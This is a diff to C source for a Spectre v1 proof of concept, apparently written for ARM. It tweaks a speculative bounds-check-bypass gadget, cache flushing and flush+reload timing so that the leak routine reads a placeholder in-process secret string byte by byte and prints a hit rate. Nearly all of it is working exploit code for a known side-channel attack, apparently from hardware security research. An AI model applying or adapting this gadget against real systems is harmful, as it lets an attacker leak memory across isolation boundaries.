@@ -38,7 +38,7 @@
 #define REPEAT_8(x)  x x x x x x x x
 
 static unsigned char *size;
-static unsigned int data __attribute__((aligned(4096))) = 16;
+static unsigned int cachemiss __attribute__((aligned(4096))) = 16;
 uint8_t fake_buffer[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t *reloadbuffer;
 char *secret = "123457812345678";
@@ -81,15 +81,18 @@ static inline __attribute__((always_inline)) void measure_time() {
 
 
 static inline  __attribute__((always_inline)) void spectre_v1( size_t index) {
-	size[0] = 16;
-	pick = data;
+	//size[0] = 0;
+	//pick = size[0];
+	isb();
+	pick = cachemiss;
+	//size[0] = 0;
 	//size = 16;
 	/*
 	 * Spectre v1 runahead
 	 */
-	MOV(15);
-	if (index < size[0] + 16)
+	if (index < size[0])
 	{	
+		MOV(20);
 		pick = reloadbuffer[fake_buffer[index] << 12];
 	}
 	//measure_time();
@@ -125,7 +128,7 @@ static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *b
 			probe_addr = (probe_addr | (probe_addr >> 8)); 
 			probe_addr = train_index ^ (probe_addr & (target ^ train_index));
 //			cacheflush(&size);
-			cacheflush(&data);
+			cacheflush(&cachemiss);
 			//for(volatile int z = 0; z < 100; z++){}
 			isb();
 	//		pick = data;
@@ -158,17 +161,19 @@ static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *b
 			hit = m;
 		}
 	}
-	printf("cache hit: %c, %x\n", (uint8_t)hit, hit);
+	printf("cache hit: %c, %x, hitrate: %f\n", (uint8_t)hit, hit, (double)results[hit] / 800);
 	*byte = (uint8_t)hit;
 }
 
 int main(int argc, const char * * argv) {
 	reloadbuffer = (unsigned char *)mmap(0, RELOAD_BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
-	size = (unsigned char *)mmap(0, 10, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
+	//size = (unsigned char *)mmap(0, 10, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+	size = (unsigned char *)malloc(10);
 	size_t offset = (size_t)(secret - (char *)fake_buffer);
 	int secret_len = strlen(secret);
 	uint8_t byte;
 	memset(reloadbuffer, 1, sizeof(uint8_t) * RELOAD_BUF_SIZE);
+	memset(size, 0x10, 10);
 
 	uint8_t *leaked = (uint8_t *)malloc(sizeof(uint8_t) * secret_len);
 
